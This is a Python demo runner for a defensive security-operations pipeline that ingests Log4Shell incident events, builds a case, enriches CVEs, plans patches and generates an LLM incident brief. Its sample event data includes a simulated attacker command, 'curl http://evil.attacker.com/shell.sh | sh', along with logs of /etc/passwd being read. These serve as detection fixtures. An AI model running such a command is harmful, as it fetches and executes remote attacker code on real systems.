#!/usr/bin/env python3
"""
SOC Autopilot Demo Runner
Full pipeline: Ingest → Replay → Case Build → Enrich → Patch Plan → LLM Brief

Usage:
  python demo_soc.py --bots_path data/bots --rate 2000 --window_size 300
"""

import os
import sys
import json
import time
import argparse
from pathlib import Path
from datetime import datetime

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from ingest.bots_loader import CanonicalEvent, load_bots_folder, write_canonical_jsonl
from agent.case_builder import build_case_from_events
from agent.patch_plan import generate_patch_plan, ExposedService
from intel.enrich import enrich_cve_list
from llm.cerebras_client import generate_incident_brief


# Sample services for demo (replace with real dep-check output)
DEMO_SERVICES = [
    ExposedService("api-gateway", "web-srv-01", "log4j-core", "2.14.0",
                   ["CVE-2021-44228"], "internet-facing", "critical"),
    ExposedService("search-service", "app-srv-02", "log4j-core", "2.14.1",
                   ["CVE-2021-44228", "CVE-2021-45046"], "internal", "high"),
    ExposedService("payment-processor", "app-srv-03", "log4j-core", "2.12.1",
                   ["CVE-2021-44228"], "internal", "critical"),
    ExposedService("logging-aggregator", "log-srv-01", "log4j-core", "2.10.0",
                   ["CVE-2021-44228"], "isolated", "medium"),
]

# Sample events for demo when no BOTS data available
DEMO_EVENTS = [
    {"ts": "2024-01-15T10:01:00Z", "source": "bots", "event_type": "web", "host": "web-srv-01",
     "src_ip": "203.0.113.50", "dst_ip": "10.0.1.20", "severity": "high",
     "message": "GET /api/search?q=[log4j-jndi-pattern:redacted] HTTP/1.1 200", "fields": {}},
    {"ts": "2024-01-15T10:01:01Z", "source": "bots", "event_type": "dns", "host": "web-srv-01",
     "src_ip": "10.0.1.20", "message": "DNS query: evil.attacker.com -> 198.51.100.10", "fields": {}},
    {"ts": "2024-01-15T10:01:02Z", "source": "bots", "event_type": "alert", "host": "web-srv-01",
     "src_ip": "10.0.1.20", "dst_ip": "198.51.100.10", "severity": "critical",
     "message": "IDS Alert: Outbound LDAP to suspicious IP 198.51.100.10:1389", "fields": {}},
    {"ts": "2024-01-15T10:01:03Z", "source": "bots", "event_type": "process", "host": "web-srv-01",
     "severity": "critical", "message": "Java process loaded remote class: Exploit.class from 198.51.100.10", "fields": {}},
    {"ts": "2024-01-15T10:01:04Z", "source": "bots", "event_type": "process", "host": "web-srv-01",
     "user": "www-data", "severity": "critical",
     "message": "Process spawned: /bin/sh -c 'curl http://evil.attacker.com/shell.sh | sh'", "fields": {}},
    {"ts": "2024-01-15T10:01:05Z", "source": "bots", "event_type": "alert", "host": "web-srv-01",
     "src_ip": "10.0.1.20", "dst_ip": "198.51.100.10", "severity": "high",
     "message": "Netflow: Large outbound transfer 10.0.1.20 -> 198.51.100.10:443 (15KB)", "fields": {}},
    {"ts": "2024-01-15T10:01:10Z", "source": "bots", "event_type": "file", "host": "web-srv-01",
     "user": "www-data", "severity": "high",
     "message": "File access: /etc/passwd read by process sh (pid 12345)", "fields": {}},
    {"ts": "2024-01-15T10:01:15Z", "source": "bots", "event_type": "auth", "host": "web-srv-01",
     "user": "www-data", "severity": "critical",
     "message": "Privilege escalation attempt: www-data tried sudo to root", "fields": {}},
]


def run_soc_demo(bots_path: str = None, rate: int = 2000, window_size: int = 300,
                 output_dir: str = "artifacts", compare_gemini: bool = False) -> dict:
    """Run full SOC autopilot demo."""
    
    artifacts_dir = Path(output_dir)
    artifacts_dir.mkdir(exist_ok=True)
    
    bench = {
        "start_time": datetime.now().isoformat(),
        "config": {"bots_path": bots_path, "rate": rate, "window_size": window_size}
    }

    # Write initial ui_state atomically so frontend immediately sees a running state
    try:
        ui_state_path = artifacts_dir / "ui_state.json"
        tmp_path = ui_state_path.with_suffix('.tmp')
        ui_running = {
            "run_id": datetime.utcnow().isoformat() + "Z",
            "status": "running",
            "metrics": {},
            "red": {"stage": "complete", "recent_events": []},
            "blue": {}
        }
        artifacts_dir.mkdir(parents=True, exist_ok=True)
        with open(tmp_path, 'w', encoding='utf-8') as f:
            json.dump(ui_running, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, ui_state_path)
        print(f"      Wrote initial {ui_state_path}")
    except Exception as e:
        print(f"Failed to write initial ui_state: {e}")
    
    print("=" * 70)
    print("SOC AUTOPILOT DEMO - Cerebras Speed Challenge")
    print("=" * 70)
    print()
    
    total_start = time.time()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 1: Ingest events
    # ─────────────────────────────────────────────────────────────────────
    print("[1/6] Ingesting events...")
    ingest_start = time.time()
    
    if bots_path and Path(bots_path).exists():
        events = load_bots_folder(bots_path, limit=10000)
        print(f"      Loaded {len(events)} events from {bots_path}")
    else:
        print("      Using demo events (no BOTS data found)")
        events = [CanonicalEvent.from_dict(e) for e in DEMO_EVENTS]
    
    bench["ingest_time_sec"] = round(time.time() - ingest_start, 3)
    bench["events_count"] = len(events)
    
    # Write sample events
    sample_path = artifacts_dir / "sample_events.jsonl"
    write_canonical_jsonl(events[:1000], str(sample_path))
    print(f"      Wrote {min(len(events), 1000)} events to {sample_path}")
    print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 2: Case building (deterministic)
    # ─────────────────────────────────────────────────────────────────────
    print("[2/6] Building case from events...")
    case_start = time.time()
    
    case_id = f"CASE-{datetime.now().strftime('%Y%m%d')}-001"
    case = build_case_from_events(events, case_id)
    
    bench["case_build_time_sec"] = round(time.time() - case_start, 3)
    print(f"      Case {case_id}: {len(case.hosts)} hosts, {len(case.src_ips)} IPs, {len(case.evidence)} evidence items")
    print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 3: CVE enrichment (KEV + EPSS)
    # ─────────────────────────────────────────────────────────────────────
    print("[3/6] Enriching CVEs (KEV + EPSS)...")
    enrich_start = time.time()
    
    target_cves = ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"]
    cve_intel = enrich_cve_list(target_cves)
    
    bench["enrich_time_sec"] = round(time.time() - enrich_start, 3)
    
    intel_path = artifacts_dir / "intel_enriched_cves.json"
    with open(intel_path, "w") as f:
        json.dump(cve_intel, f, indent=2)
    print(f"      Wrote {intel_path}")
    print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 4: Patch plan (deterministic)
    # ─────────────────────────────────────────────────────────────────────
    print("[4/6] Generating patch plan...")
    patch_start = time.time()
    
    patch_plan = generate_patch_plan(DEMO_SERVICES)
    
    bench["patch_plan_time_sec"] = round(time.time() - patch_start, 3)
    
    patch_path = artifacts_dir / "patch_plan.json"
    with open(patch_path, "w") as f:
        json.dump(patch_plan, f, indent=2)
    print(f"      Wrote {patch_path}")
    print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 5: LLM incident brief (Cerebras)
    # ─────────────────────────────────────────────────────────────────────
    print("[5/6] Generating incident brief (Cerebras)...")
    llm_start = time.time()
    
    brief_result = generate_incident_brief(
        case_data=case.to_dict(),
        cve_intel=cve_intel,
        patch_plan=patch_plan,
        provider="cerebras"
    )
    
    bench["cerebras_time_sec"] = round(time.time() - llm_start, 3)
    bench["cerebras_tokens_out"] = brief_result.get("tokens_out", 0)
    bench["cerebras_tokens_per_sec"] = brief_result.get("tokens_per_sec", 0)
    
    brief_path = artifacts_dir / "incident_brief.json"
    with open(brief_path, "w") as f:
        json.dump(brief_result.get("brief", brief_result), f, indent=2)
    print(f"      Time: {bench['cerebras_time_sec']}s, Speed: {bench['cerebras_tokens_per_sec']} tokens/sec")
    print(f"      Wrote {brief_path}")
    
    # Basic validation
    if "brief" in brief_result:
        brief = brief_result["brief"]
        required = ["case_id", "summary", "timeline"]
        missing = [f for f in required if f not in brief]
        print(f"      Schema valid: {len(missing) == 0}")
        if missing:
            print(f"      Missing: {missing}")
    print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 5b: Gemini comparison (optional)
    # ─────────────────────────────────────────────────────────────────────
    if compare_gemini:
        print("[5b] Generating incident brief (Gemini for comparison)...")
        gemini_start = time.time()
        
        gemini_result = generate_incident_brief(
            case_data=case.to_dict(),
            cve_intel=cve_intel,
            patch_plan=patch_plan,
            provider="gemini"
        )
        
        bench["gemini_time_sec"] = round(time.time() - gemini_start, 3)
        bench["speedup_vs_gemini"] = round(bench["gemini_time_sec"] / bench["cerebras_time_sec"], 2) if bench["cerebras_time_sec"] > 0 else 0
        
        print(f"      Gemini time: {bench['gemini_time_sec']}s")
        print(f"      >>> CEREBRAS SPEEDUP: {bench['speedup_vs_gemini']}x faster <<<")
        print()
    
    # ─────────────────────────────────────────────────────────────────────
    # STEP 6: Write timeline + final artifacts
    # ─────────────────────────────────────────────────────────────────────
    print("[6/6] Writing final artifacts...")
    
    # Timeline CSV
    timeline_path = artifacts_dir / "incident_timeline.csv"
    with open(timeline_path, "w") as f:
        f.write("ts,event,evidence_id\n")
        for t in case.timeline[:50]:
            f.write(f'"{t["ts"]}","{t["event"][:100]}","{t["evidence_id"]}"\n')
    print(f"      Wrote {timeline_path}")
    
    # Entities
    entities_path = artifacts_dir / "entities.json"
    with open(entities_path, "w") as f:
        json.dump({"hosts": list(case.hosts), "users": list(case.users),
                   "src_ips": list(case.src_ips), "dst_ips": list(case.dst_ips)}, f, indent=2)
    print(f"      Wrote {entities_path}")
    
    # Exposure summary (from demo services)
    exposure_path = artifacts_dir / "exposure_summary.json"
    with open(exposure_path, "w") as f:
        json.dump([{"service": s.name, "component": s.component, "version": s.version,
                    "cves": s.cves, "exposure": s.exposure} for s in DEMO_SERVICES], f, indent=2)
    print(f"      Wrote {exposure_path}")
    
    # ─────────────────────────────────────────────────────────────────────
    # FINAL: Benchmark results
    # ─────────────────────────────────────────────────────────────────────
    bench["total_runtime_sec"] = round(time.time() - total_start, 3)
    bench["events_per_sec"] = round(bench["events_count"] / bench["ingest_time_sec"], 1) if bench["ingest_time_sec"] > 0 else 0
    bench["time_to_first_brief_sec"] = bench["cerebras_time_sec"]
    bench["time_to_full_report_sec"] = bench["total_runtime_sec"]
    
    bench_path = artifacts_dir / "bench_results.json"
    with open(bench_path, "w") as f:
        json.dump(bench, f, indent=2)
    print(f"      Wrote {bench_path}")
    print()

    # Write ui_state periodically / at end so frontend can read a single source of truth
    def build_ui_state(status="running"):
        # Basic metrics
        metrics = {
            "events_total": bench.get("events_count", 0),
            "events_per_sec": bench.get("events_per_sec", 0),
            "tokens_per_sec": bench.get("cerebras_tokens_per_sec", 0),
            "time_to_first_brief_sec": bench.get("time_to_first_brief_sec", 0),
            "time_to_full_report_sec": bench.get("time_to_full_report_sec", 0),
            "total_runtime_sec": bench.get("total_runtime_sec", 0),
        }

        # Red signals & recent events fallback
        recent = []
        for e in events[:10]:
            recent.append({
                "ts": getattr(e, 'ts', e.get('ts') if isinstance(e, dict) else None) or str(datetime.utcnow().isoformat()),
                "type": getattr(e, 'event_type', e.get('event_type') if isinstance(e, dict) else 'web'),
                "msg": getattr(e, 'message', e.get('message') if isinstance(e, dict) else ''),
                "sev": getattr(e, 'severity', e.get('severity') if isinstance(e, dict) else 'low')
            })

        # Red stage heuristic
        def detect_stage(evts):
            types = " ".join([str(getattr(x, 'event_type', x.get('event_type') if isinstance(x, dict) else '')) for x in evts])
            msgs = " ".join([str(getattr(x, 'message', x.get('message') if isinstance(x, dict) else '')) for x in evts])
            if 'ldap' in msgs or 'LDAP' in msgs or 'ldap' in types:
                return 'ldap_egress'
            if 'dns' in types or 'DNS' in msgs:
                return 'dns_callbacks'
            if 'EDR' in msgs or 'child' in msgs or 'process' in types:
                return 'edr_anomaly'
            if 'outbound' in msgs or 'transfer' in msgs or 'bytes' in msgs:
                return 'exfil_suspected'
            if 'auth' in types or 'privilege' in msgs or 'sudo' in msgs:
                return 'lateral_auth'
            return 'complete'

        red = {
            "stage": detect_stage(events),
            "score": 0.0,
            "signals": [],
            "recent_events": recent,
        }

        # Blue fallbacks
        hosts = list(case.hosts) if case else []
        ips = list(case.src_ips) + list(case.dst_ips) if case else []
        users = list(case.users) if case else []

        attack_mapping = []
        if red['stage'] == 'dns_callbacks':
            attack_mapping.append({"technique": "DNS callback", "rationale": "DNS queries to suspicious domains"})
        elif red['stage'] == 'ldap_egress':
            attack_mapping.append({"technique": "LDAP egress via JNDI", "rationale": "Outbound LDAP observed"})
        elif red['stage'] == 'edr_anomaly':
            attack_mapping.append({"technique": "Process anomaly", "rationale": "Unexpected child process / remote class load"})
        elif red['stage'] == 'exfil_suspected':
            attack_mapping.append({"technique": "Exfiltration", "rationale": "Large outbound transfer detected"})
        elif red['stage'] == 'lateral_auth':
            attack_mapping.append({"technique": "Lateral movement via auth", "rationale": "Authentication anomalies detected"})
        else:
            attack_mapping.append({"technique": "Unknown", "rationale": "Stage complete or insufficient signals"})

        patch_priority = []
        # If patch_plan exists, use it, otherwise fallback sample
        try:
            for p in patch_plan if isinstance(patch_plan, list) else []:
                patch_priority.append({
                    "service": p.get('service') if isinstance(p, dict) else getattr(p, 'service', str(p)),
                    "priority": p.get('priority', 2) if isinstance(p, dict) else getattr(p, 'priority', 2),
                    "why": p.get('rationale', '') if isinstance(p, dict) else getattr(p, 'rationale', ''),
                    "kev": True if 'CVE' in str(p.get('rationale', '')) else False,
                    "epss": 0.0
                })
        except Exception:
            patch_priority = []

        if not patch_priority:
            patch_priority = [{"service": "log4j", "priority": 1, "why": "KEV/EPSS high", "kev": True, "epss": 0.9}]

        blue = {
            "case_id": case_id,
            "severity": "high",
            "summary": (brief_result.get('brief', {}).get('summary') if isinstance(brief_result, dict) else '') or "Awaiting brief...",
            "key_entities": {"hosts": hosts, "ips": ips, "users": users},
            "attack_mapping": attack_mapping,
            "containment": [{"action": "isolate host", "why": "suspected compromise"}],
            "patch_priority": patch_priority,
            "timeline": [{"ts": t["ts"], "event": t["event"]} for t in (case.timeline[:20] if case and getattr(case, 'timeline', None) else [])]
        }

        ui = {
            "run_id": datetime.utcnow().isoformat() + "Z",
            "status": status,
            "metrics": metrics,
            "red": red,
            "blue": blue
        }

        return ui

    # write final ui_state atomically (status=complete) and include result
    ui_state_path = artifacts_dir / "ui_state.json"
    try:
        result_status = "success"
        if not case or not getattr(case, 'evidence', None):
            result_status = "inconclusive"
        final_ui = build_ui_state(status="complete")
        final_ui["result"] = result_status
        tmp_path = ui_state_path.with_suffix('.tmp')
        with open(tmp_path, 'w', encoding='utf-8') as f:
            json.dump(final_ui, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, ui_state_path)
        print(f"      Wrote final {ui_state_path}")
    except Exception as e:
        print(f"Failed to write final ui_state: {e}")
    
    # ─────────────────────────────────────────────────────────────────────
    # Summary
    # ─────────────────────────────────────────────────────────────────────
    print("=" * 70)
    print("DEMO COMPLETE")
    print("=" * 70)
    print(f"Total runtime:        {bench['total_runtime_sec']}s")
    print(f"Events processed:     {bench['events_count']}")
    print(f"Cerebras brief time:  {bench['cerebras_time_sec']}s")
    print(f"Cerebras tokens/sec:  {bench['cerebras_tokens_per_sec']}")
    if compare_gemini:
        print(f"Gemini brief time:    {bench.get('gemini_time_sec', 'N/A')}s")
        print(f"SPEEDUP:              {bench.get('speedup_vs_gemini', 'N/A')}x")
    print()
    print(f"Artifacts written to: {artifacts_dir.absolute()}")
    print("=" * 70)
    
    return bench


def main():
    parser = argparse.ArgumentParser(description="SOC Autopilot Demo")
    parser.add_argument("--bots_path", "-b", help="Path to BOTS export folder")
    parser.add_argument("--rate", "-r", type=int, default=2000, help="Replay rate (events/sec)")
    parser.add_argument("--window_size", "-w", type=int, default=300, help="Window size for batching")
    parser.add_argument("--output_dir", "-o", default="artifacts", help="Output directory")
    parser.add_argument("--compare", "-c", action="store_true", help="Compare Cerebras vs Gemini")
    
    args = parser.parse_args()
    
    run_soc_demo(
        bots_path=args.bots_path,
        rate=args.rate,
        window_size=args.window_size,
        output_dir=args.output_dir,
        compare_gemini=args.compare
    )


if __name__ == "__main__":
    main()